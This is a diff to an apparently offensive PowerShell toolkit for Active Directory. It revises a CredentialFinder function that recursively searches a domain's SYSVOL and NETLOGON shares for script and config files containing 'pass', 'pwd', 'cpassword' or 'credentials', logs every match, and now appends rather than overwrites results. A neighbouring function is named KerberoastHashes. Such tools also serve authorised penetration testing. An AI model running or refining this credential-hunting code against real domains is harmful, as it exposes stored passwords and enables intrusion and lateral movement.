@@ -56,10 +56,11 @@ function KerberoastHashes{
 
 function CredentialFinder{
     param($Domain, $fileExtensions = @("xml", "txt", "ps1", "vbs", "js", "vba", "cmd", "bat"), $keywords = @("pass", "pwd", "cpassword", "creds", "credentials"))
-    $shares = @("sysvol","netlogon")
+    $shares = @("netlogon","sysvol")
     
     foreach($share in $shares) {
         $path = "\\$Domain\$share\"
+        Write-Host "Enumerating: $path"
         foreach ($extension in $fileExtensions) {
             Get-ChildItem -Path $path  -Filter "*.$extension" -Recurse -FollowSymlink | ForEach-Object {
                 # Gather full path and file name
@@ -72,7 +73,7 @@ function CredentialFinder{
                 # Search for each keyword using regular expressions
                 foreach ($keyword in $keywords) {
                     if ($fileContent -match $keyword) {
-                        "Keyword found in: $fullPath ($fileName) - Keyword: $keyword" | Out-File -FilePath .\CredentialFinder.txt
+                        "Keyword found in: $fullPath ($fileName) - Keyword: $keyword" | Out-File -FilePath .\CredentialFinder.txt -Append
                     }
                 }
             }
@@ -83,7 +84,7 @@ function CredentialFinder{
         New-Item -ItemType Directory -Path "$currentPath\CredentialFinder"
     }
     Move-Item "$currentPath\CredentialFinder.txt" -Destination "$currentPath\CredentialFinder" -Force
-    }
+}
 
 
     
